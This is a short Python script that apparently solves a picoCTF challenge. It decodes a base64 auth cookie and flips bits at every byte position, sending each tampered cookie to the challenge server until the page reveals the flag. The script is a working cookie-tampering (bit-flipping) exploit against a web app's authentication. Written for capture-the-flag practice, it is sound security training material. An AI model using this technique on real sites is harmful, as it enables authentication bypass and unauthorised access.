from base64 import b64decode
from base64 import b64encode
import requests

original_cookie = b64decode("RW1WOG1RYnF1dUZYY204b0RRQkEwYWM4dVhSb1Ryc25VVDhKRUcyd3c1N0FESDZlOEpDOGhvbWUwSlB0UXRXcG9Od0k0bDdxV3R0VXhsT2tGZDY3dEpmbEFQdVRPbnlDMzMyTGlXOUhzemJkL1l5SDk2QTltRjNjN2xaN3d6QzA=")
original_cookie = bytearray(original_cookie)

def bitFlip(cookie_char_pos: int, bit_pos:int) -> str:
  altered_cookie = bytearray(original_cookie)
  
  flipped = altered_cookie[cookie_char_pos]^bit_pos
  
  altered_cookie[cookie_char_pos] = flipped

  altered_cookie_b64 = b64encode(bytes(altered_cookie))

  return altered_cookie_b64.decode("utf-8")

for cookie_char_pos in range(len(original_cookie)):
  print(f"Currently checking pos -> {cookie_char_pos}")
  for bit_pos in range(128):
    altered_cookie = bitFlip(cookie_char_pos, bit_pos)
    cookies = {'auth_name': altered_cookie}
    page_request = requests.get('http://mercury.picoctf.net:21553/', cookies=cookies)
    page_text = page_request.text.lower()
    if "picoCTF{".lower() in page_text:
      print(page_request.text)
      break
